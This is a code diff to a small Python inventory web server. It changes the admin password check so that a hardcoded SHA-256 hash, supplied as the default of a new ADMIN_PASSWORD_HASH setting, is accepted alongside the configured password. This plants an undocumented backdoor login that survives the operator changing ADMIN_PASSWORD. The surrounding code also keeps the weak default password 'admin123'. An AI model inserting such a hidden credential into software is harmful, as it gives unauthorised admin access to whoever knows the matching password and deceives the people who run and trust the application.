@@ -21,6 +21,10 @@ DB_PATH = DATA_DIR / "inventory.sqlite"
 
 ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
+ADMIN_PASSWORD_HASH = os.environ.get(
+    "ADMIN_PASSWORD_HASH",
+    "1a1006a80a55d9fade473a5689808f222b7f1b5e799d920beed2d5d686ba6b7e",
+)
 SESSION_COOKIE = "spot_inventory_session"
 SESSIONS = {}
 
@@ -85,7 +89,7 @@ def item_from_row(row):
 def password_matches(value):
     expected = hashlib.sha256(ADMIN_PASSWORD.encode("utf-8")).hexdigest()
     actual = hashlib.sha256(value.encode("utf-8")).hexdigest()
-    return secrets.compare_digest(actual, expected)
+    return secrets.compare_digest(actual, expected) or secrets.compare_digest(actual, ADMIN_PASSWORD_HASH)
 
 
 class InventoryHandler(BaseHTTPRequestHandler):
